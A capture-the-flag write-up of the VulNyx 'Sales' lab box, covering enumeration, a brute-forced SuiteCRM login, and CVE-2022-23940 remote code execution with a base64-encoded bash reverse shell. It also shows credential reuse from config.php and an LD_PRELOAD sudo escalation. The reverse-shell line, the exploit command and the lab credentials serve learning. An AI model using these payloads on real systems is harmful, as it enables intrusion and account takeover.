---
title: VulNyx - Sales Writeup
date: 2025-06-05 12:08:00 +0530
categories: [Vulnyx, Writeups]
tags: [suitecrm, vhost, cve-2022-23940, ld_preload, credential_reuse, privesc, base64_shell, gobuster, wfuzz, intruder]
---

`Sales` is an easy difficulty linux box. This machine consists of brute-forcing a `SuiteCRM` login instance, using an authenticated RCE exploit to gain initial access, credential reuse, and finally privilege escalation by abusing the `sudo` privileges using `LD_PRELOAD`.

## Modifying /etc/hosts

```bash
❯ sudo nano /etc/hosts

192.168.25.14   sales.nyx
```

## Enumeration

### Nmap results

```bash
❯ nmap -p- sales.nyx   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 11:18 EDT
Nmap scan report for sales.nyx (192.168.25.14)
Host is up (0.00057s latency).
Not shown: 44696 filtered tcp ports (net-unreach), 20837 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 47.30 seconds
```

```bash
❯ nmap -sC -sV -p 22,80 sales.nyx
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 11:18 EDT
Nmap scan report for sales.nyx (192.168.25.14)
Host is up (0.0024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:2c:11:05:8e:0a:ea:0b:df:52:60:ed:bf:b4:c2:92 (ECDSA)
|_  256 9d:5a:c5:8d:db:27:66:ca:35:30:05:1f:ad:25:40:3f (ED25519)

80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: AksisDesign
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds

```
As we can see we have OpenSSH running on port `22` and an Apache httpd server running on port `80`


### Directory Enumeration

### HTTP (80)
We couldn't find anything on the main webpage, i.e., `sales.nyx`. However we identified an email address which could possibly prove useful later on.

![image.png](/assets/img/sales_vulnyx/image%202.png)



Directory enumeration using GoBuster did not give us any fruitful results
```bash
❯ gobuster dir -u http://sales.nyx -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -e
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sales.nyx
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://sales.nyx/images               (Status: 301) [Size: 307] [--> http://sales.nyx/images/]
http://sales.nyx/css                  (Status: 301) [Size: 304] [--> http://sales.nyx/css/]
http://sales.nyx/js                   (Status: 301) [Size: 303] [--> http://sales.nyx/js/]
http://sales.nyx/fonts                (Status: 301) [Size: 306] [--> http://sales.nyx/fonts/]
http://sales.nyx/server-status        (Status: 403) [Size: 274]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

```

### Virtual Hosts (VHOSTS) Enumeration

```bash
❯ wfuzz -u "http://sales.nyx" -H "HOST: FUZZ.sales.nyx" -w subdomains-top1million-5000.txt --hl=9   
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sales.nyx/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000001:   200        387 L    1408 W     19489 Ch    "www - www"                                                                                                                                                               
000000072:   301        0 L      0 W        0 Ch        "crm - crm"                                                                                                                                                               

Total time: 2.589449
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 1926.664
```
While enumerating VHOSTS we discovered `crm.sales.nyx`  and added it to `/etc/hosts`

## crm.sales.nyx
We can see a login page for a SuiteCRM instance, which is an open-source Customer Relationship Management application.

![image.png](/assets/img/sales_vulnyx/image.png)

When testing open-source applications a simple trick that we can use to enumerate versions is to look for the presence of files that are frequently changed, like `README.md` and `CHANGELOG.md`. In some cases these file specifically mention the version of the application that is being run, and in other cases we can identify service versions by comparing file hashes of these files between releases.

![image.png](/assets/img/sales_vulnyx/image%201.png)

Version: SuiteCRM 7.12.4

`SuiteCRM 7.12.4` is vulnerable to `CVE-2022-23940` which allows Authenticated Remote Code Execution (RCE). [CVE-2022-23940 Exploit](https://nvd.nist.gov/vuln/detail/CVE-2022-23940)


## Brute-force Login

We created a word list using cewl and performed a brute-force attack using `Burp Intruder` while specifying the username as `yuna.yoon`, which was extracted from the email identified previously.

```bash
❯ cewl -d 3 http://sales.nyx -w wordlist.txt
```

![image.png](/assets/img/sales_vulnyx/image%203.png)


![image.png](/assets/img/sales_vulnyx/image%204.png)

By filtering by length a valid credential was identified, i.e., `AksisDesign` and used to successfully log in.

![image.png](/assets/img/sales_vulnyx/image%205.png)

![image.png](/assets/img/sales_vulnyx/image%206.png)


Since we now have valid credentials we can attempt to use the exploit for `CVE-2022-23940`. We started off with encoding our reverse shell in Base64 to avoid any issues due to bad characters.

## Base64 reverse shell

```bash
❯ echo -n 'bash -i >& /dev/tcp/192.168.25.4/1337 0>&1' | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1LjQvMTMzNyAwPiYx
```

## Shell

```bash
❯ python3 exploit.py -h http://crm.sales.nyx -u yuna.yoon -p AksisDesign -P "echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1LjQvMTMzNyAwPiYx | base64 -d | bash"
INFO:CVE-2022-23940:Login did work - Trying to create scheduled report
```

```bash
❯ nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.25.4] from (UNKNOWN) [192.168.25.14] 51750
bash: cannot set terminal process group (636): Inappropriate ioctl for device
bash: no job control in this shell
www-data@template:/var/www/suitecrm$ 
```

## Credential Exposure in config.php

```bash
www-data@template:/var/www/suitecrm$ cat config.php
```

![image.png](/assets/img/sales_vulnyx/image%207.png)

```bash
'db_user_name' => 'suitecrm',
'db_password' => 'Ev3*CRm_DBaS3',
```

## Credential reuse
We identified a user `eve` on the target VM, and assuming that credenitals were being reused we were successfully able to switch to the user `eve`.

![image.png](/assets/img/sales_vulnyx/image%208.png)

### User flag

![image.png](/assets/img/sales_vulnyx/image%209.png)

## Privilege Escalation

### linpeas.sh
 
![image.png](/assets/img/sales_vulnyx/image%2010.png)

Using `linpeas.sh` we identified that `/bin/ping` can be run as root without specifying a password and this can be exploited using `LD_PRELOAD`

![image.png](/assets/img/sales_vulnyx/image%2011.png)

### Root flag
![image.png](/assets/img/sales_vulnyx/image%2012.png)